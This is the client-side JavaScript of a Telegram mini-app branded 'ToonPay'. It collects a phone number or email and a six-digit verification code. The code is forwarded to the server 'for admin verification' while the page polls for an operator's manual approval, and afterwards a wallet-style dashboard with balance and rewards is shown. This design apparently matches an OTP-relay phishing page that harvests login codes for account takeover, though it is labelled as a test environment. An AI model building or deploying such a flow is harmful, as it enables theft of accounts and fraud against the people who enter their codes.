const tg=window.Telegram?.WebApp;
if(tg){tg.ready();tg.expand()}

const app=document.getElementById("app");
const u=tg?.initDataUnsafe?.user||{};
const telegramId=u.id||999000001;
const username=u.username||"test_user";

let requestId=null;
let pollTimer=null;
let sessionToken=localStorage.getItem("toonpay_test_session");

const esc=v=>String(v).replace(/[&<>"']/g,c=>({
  "&":"&amp;",
  "<":"&lt;",
  ">":"&gt;",
  '"':"&quot;",
  "'":"&#039;"
}[c]));

const render=h=>app.innerHTML=h;
const logo=()=>`<div class="logo">✚</div>`;

function showLogin(){
  clearInterval(pollTimer);

  render(`
    <div class="screen">
      <div class="topbar">
        <div class="brand">${logo()}<span>ToonPay</span></div>
      </div>

      <div class="auth-title">Welcome Back to ToonPay</div>
      <div class="auth-subtitle">
        Enter your phone number to continue. We'll send a verification code.
      </div>

      <div class="input-wrap">
        <input id="phoneInput" class="input" type="tel"
          inputmode="tel" placeholder="+1234567890">
      </div>

      <button class="primary-button" onclick="startLogin('phone')">
        Send Code
      </button>

      <div class="divider"><span>or</span></div>

      <button class="secondary-button" onclick="showEmailLogin()">
        ✉ &nbsp; Continue with E-mail
      </button>
    </div>
  `);
}

function showEmailLogin(){
  render(`
    <div class="screen">
      <div class="topbar">
        <div class="brand">${logo()}<span>ToonPay</span></div>
      </div>

      <div class="auth-title">Continue with E-mail</div>
      <div class="auth-subtitle">
        Enter your email address to continue.
      </div>

      <div class="input-wrap">
        <input id="emailInput" class="input"
          type="email" placeholder="user@example.com">
      </div>

      <button class="primary-button" onclick="startLogin('email')">
        Continue
      </button>

      <button class="secondary-button" onclick="showLogin()">
        Back
      </button>
    </div>
  `);
}

async function startLogin(method){
  const input=document.getElementById(
    method==="email" ? "emailInput" : "phoneInput"
  );

  const value=input.value.trim();

  if(!value){
    return toast("Please enter your details.");
  }

  try{
    const r=await fetch("/api/login/request",{
      method:"POST",
      headers:{
        "Content-Type":"application/json"
      },
      body:JSON.stringify({
        telegram_id:telegramId,
        username,
        login_value:value,
        login_method:method
      })
    });

    const d=await r.json();

    if(!r.ok){
      return toast(d.detail||"Unable to continue.");
    }

    requestId=d.request_id;
    showOtp(value);

  }catch(e){
    toast("Connection error. Please try again.");
  }
}

function showOtp(value){
  render(`
    <div class="screen">
      <div class="topbar">
        <div class="brand">${logo()}<span>ToonPay</span></div>
      </div>

      <div class="auth-title">Enter 6-digit Code</div>

      <div class="auth-subtitle">
        Enter the verification code to continue.
        <br><br>
        Code requested for:
        <strong>${esc(value)}</strong>
      </div>

      <input
        id="otpInput"
        class="otp-box"
        inputmode="numeric"
        maxlength="6"
        placeholder="------"
      >

      <button class="primary-button" onclick="submitOtp()">
        Verify
      </button>

      <button class="secondary-button" onclick="showLogin()">
        Resend Code
      </button>

      <div id="otpStatus" class="waiting">
        Waiting for verification...
      </div>
    </div>
  `);

  document.getElementById("otpInput").addEventListener(
    "input",
    function(){
      this.value=this.value
        .replace(/\D/g,"")
        .slice(0,6);
    }
  );

  pollTimer=setInterval(checkStatus,1500);
}

async function submitOtp(){
  const code=document.getElementById("otpInput").value;

  if(!/^\d{6}$/.test(code)){
    return otpMsg(
      "Enter exactly 6 digits.",
      "error"
    );
  }

  try{
    const r=await fetch("/api/login/submit-code",{
      method:"POST",
      headers:{
        "Content-Type":"application/json"
      },
      body:JSON.stringify({
        request_id:requestId,
        entered_code:code
      })
    });

    const d=await r.json();

    if(!r.ok){
      return otpMsg(
        d.detail||"Unable to submit.",
        "error"
      );
    }

    otpMsg(
      "Code sent for admin verification.",
      "success"
    );

  }catch(e){
    otpMsg("Connection error.","error");
  }
}

async function checkStatus(){
  if(!requestId)return;

  try{
    const d=await(
      await fetch(`/api/login/status/${requestId}`)
    ).json();

    if(d.status==="approved"){
      clearInterval(pollTimer);

      sessionToken=d.session_token;

      localStorage.setItem(
        "toonpay_test_session",
        sessionToken
      );

      success();

    }else if(d.status==="rejected"){
      clearInterval(pollTimer);

      otpMsg(
        "❌ Invalid OTP. Please check the code and try again.",
        "error"
      );
    }

  }catch(e){}
}

function otpMsg(m,c){
  const x=document.getElementById("otpStatus");

  if(x){
    x.innerHTML=
      `<span class="${c}">${esc(m)}</span>`;
  }
}

function success(){
  render(`
    <div class="screen"
      style="
        display:flex;
        align-items:center;
        justify-content:center;
        text-align:center
      "
    >
      <div>
        <div
          class="logo"
          style="
            width:85px;
            height:85px;
            margin:auto;
            font-size:38px
          "
        >
          ✓
        </div>

        <div
          class="auth-title"
          style="margin-top:25px"
        >
          Welcome Back
        </div>

        <div class="auth-subtitle">
          Verification successful.
          <br>
          Opening your ToonPay dashboard...
        </div>
      </div>
    </div>
  `);

  setTimeout(loadDashboard,800);
}

function toast(m){
  const x=document.createElement("div");

  x.textContent=m;

  Object.assign(x.style,{
    position:"fixed",
    left:"20px",
    right:"20px",
    bottom:"105px",
    padding:"16px",
    background:"#1d1d20",
    border:"1px solid #36363a",
    borderRadius:"18px",
    color:"#fff",
    textAlign:"center",
    zIndex:9999
  });

  document.body.appendChild(x);

  setTimeout(()=>x.remove(),2800);
}

async function loadDashboard(){
  if(!sessionToken){
    return showLogin();
  }

  try{
    const r=await fetch("/api/dashboard",{
      headers:{
        Authorization:"Bearer "+sessionToken
      }
    });

    if(!r.ok){
      localStorage.removeItem("toonpay_test_session");
      sessionToken=null;
      return showLogin();
    }

    renderHome(await r.json());

  }catch(e){
    toast("Unable to load dashboard.");
  }
}

function nav(active){
  return `
    <div class="bottom-nav">
      ${
        [
          ["⌂","Home","home","loadDashboard()"],
          ["◇","Plans","plans","simple('Plans')"],
          ["♣","Referrals","referrals","simple('Referrals')"],
          ["⚙","Settings","settings","simple('Settings')"]
        ]
        .map(x=>`
          <div
            class="nav-item ${active===x[2]?"active":""}"
            onclick="${x[3]}"
          >
            <div class="nav-icon">${x[0]}</div>
            ${x[1]}
          </div>
        `)
        .join("")
      }
    </div>
  `;
}

function renderHome(d){
  render(`
    <div class="screen">

      <div class="topbar">
        <div class="brand">
          ${logo()}
          <span>ToonPay</span>
        </div>

        <div
          class="logo"
          style="width:48px;height:48px"
        >
          🔔
        </div>
      </div>

      <div style="text-align:center">
        <div class="rewards">🎁 REWARDS</div>
      </div>

      <div class="balance-area">
        <div class="balance-label">
          TOTAL BALANCE
        </div>

        <div class="balance-value">
          $${d.balance}
        </div>
      </div>

      <div class="action-grid">

        <div
          class="action-card"
          onclick="simple('Receive')"
        >
          <div class="action-icon">↓</div>
          Receive
        </div>

        <div
          class="action-card"
          onclick="simple('Details')"
        >
          <div class="action-icon">▣</div>
          Details
        </div>

        <div
          class="action-card"
          onclick="simple('Send')"
        >
          <div class="action-icon">➤</div>
          Send
        </div>

      </div>

      <div class="dashboard-card">

        <div class="cashback-title">
          <div class="gift-circle">🎁</div>
          Cashback Balance
        </div>

        <div class="progress">
          <div
            class="progress-fill"
            style="width:${d.points}%"
          ></div>
        </div>

        <div class="points-row">
          <span>Points Earned</span>
          <strong>
            ${d.points}/${d.points_target}
          </strong>
        </div>

      </div>

      <div class="dashboard-card">

        <div
          style="
            display:flex;
            justify-content:space-between
          "
        >
          <div>
            <div class="plan-title">
              Current Plan
            </div>

            <div class="plan-name">
              ${esc(d.plan)}
            </div>
          </div>

          <div class="muted">
            Plan expires on
            <br>
            <strong style="color:#eee">
              ${esc(d.plan_expiry)}
            </strong>
          </div>
        </div>

        <div style="margin-top:20px;font-weight:700">
          Manage Plan →
        </div>

      </div>

      <div class="dashboard-card">

        <div style="font-size:20px;font-weight:600">
          Transactions
        </div>

        ${
          d.transactions.map(t=>`
            <div class="transaction">

              <div class="transaction-left">

                <div class="transaction-icon">
                  ${t.amount.startsWith("+")?"↓":"↑"}
                </div>

                <div>
                  <div>
                    ${esc(t.title)}
                  </div>

                  <div class="transaction-status">
                    ${esc(t.status)}
                  </div>
                </div>

              </div>

              <div
                class="${t.amount.startsWith("+")?"green":""}"
              >
                ${esc(t.amount)}
              </div>

            </div>
          `).join("")
        }

      </div>

      ${nav("home")}

    </div>
  `);
}

function simple(title){
  render(`
    <div class="screen">

      <div class="topbar">

        <div class="brand">
          ${logo()}
          <span>ToonPay</span>
        </div>

        <button
          class="logo"
          onclick="loadDashboard()"
        >
          ←
        </button>

      </div>

      <div class="page-title">
        ${esc(title)}
      </div>

      <div class="list-card">

        <div class="list-row">
          <span class="muted">Environment</span>
          <strong>TEST</strong>
        </div>

        <div class="list-row">
          <span class="muted">Account</span>
          <strong>@${esc(username)}</strong>
        </div>

        <div class="list-row">
          <span class="muted">Status</span>
          <strong class="green">Active</strong>
        </div>

      </div>

      ${
        title==="Settings"
        ? '<button class="primary-button" onclick="logout()">Log Out</button>'
        : ""
      }

      ${nav(title.toLowerCase())}

    </div>
  `);
}

function logout(){
  sessionToken=null;

  localStorage.removeItem(
    "toonpay_test_session"
  );

  showLogin();
}

if(sessionToken){
  loadDashboard();
}else{
  showLogin();
}
